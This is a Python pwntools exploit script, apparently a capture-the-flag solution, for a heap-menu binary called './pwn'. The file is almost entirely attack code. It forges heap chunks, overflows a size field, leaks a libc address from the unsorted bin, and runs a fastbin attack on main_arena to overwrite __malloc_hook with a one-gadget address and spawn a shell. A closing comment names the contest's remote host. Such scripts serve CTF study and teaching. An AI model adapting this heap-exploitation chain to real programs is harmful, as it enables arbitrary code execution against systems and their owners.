#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('5.Exit\n', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('3.Large\n', str(size))
	if len(content) < (size+1)*0x10:
		content += '\n'

	p.sendafter('Content:\n',content)
	print "add a chunk success"

def edit(idx, size, content):
	menu(2)
	p.recvline()
	p.sendline(str(idx))
	p.recvline()
	p.sendline(str(size))
	p.recvline()
	p.sendline(content)	

	print "edit %d chunk success" % idx

def free(idx):
	menu(3)
	p.recvline()
	p.sendline(str(idx))
	print "free chunk %d success " % idx

def show(idx):
	menu(4)
	p.recvline()
	p.sendline(str(idx))
	print "show chunk %d success " % idx

def exploit():
	add(2, '\x00')			#0
	add(2, '\x11')			#1
	add(2, '\x22')			#2

	#fake a chunk as unlink
	payload = p64(0) + p64(0x31) + p64(0)*3 + p64(0x21)
	add(2, payload)			#3

	#fake big chunk
	add(3, p64(0) + p64(0x21))	#4
	add(2, p64(0) + p64(0x21))	#5
	add(3, '\x66')				#6


	#fake chunk1's size to 0x91, contain chunk2
	edit(1, 0x80000000, p64(0)*3 + p64(0x91))		
	free(1)			#chunk1 ,2 into unsorted bin, while 2 also in chunk_ptr
	add(2, '\x11')				#7
	show(2)
	main_arena = u64(p.recvline().strip('\n').ljust(8, '\x00')) - 0x58
	print "main_arena ==> " + hex(main_arena)
	libc.address = main_arena - 0x3c4b20

	__malloc_hook = libc.symbols['__malloc_hook']

	#fastbin attack modify fd to malloc_hook 
	#payload = ''

	add(2, '\x44')				#8
	edit(2, 0x80000000, p64(0)*3 + p64(0xd1))	#modify unsorted bin's size , make a lat two pointer chunk
	free(2)
	add(2,"\xaa")				#9
	add(2,"\xaa")				#10
	add(3,"\x11")				#11
	add(1,"\x23")				#12
	add(1,"\x23")				#13

	free(12)
	free(4)
	gdb.attach(p, 'b puts')
	dbg()
	print "main_arena ==> " + hex(main_arena)
	#modify fd' size to main_arena
	fake_fd = main_arena + 0x15 - 8
	edit(11, 0, p64(fake_fd))
	add(3, '\x12')

	payload = "\x11\x11\x11"+p64(libc.address+0x3c4b50)+p64(0)*2+p64(0x51)+p64(0)
	add(3, payload)

	#modify top chunk which is in main_arena
	add(3, p64(0)*2+p64(__malloc_hook-0x10)+p64(0x3c4b78+libc.address)+p64(0x3c4b78+libc.address)+p64(0x3c4b78+libc.address))
	add(3,p64(libc.address+0xf1147))

	add(1, '\xdd')
	p.interactive()
	p.close()






if __name__ == '__main__':
	p = process('./pwn')
	exploit()

	


#nc 8sdafgh.gamectf.com 10001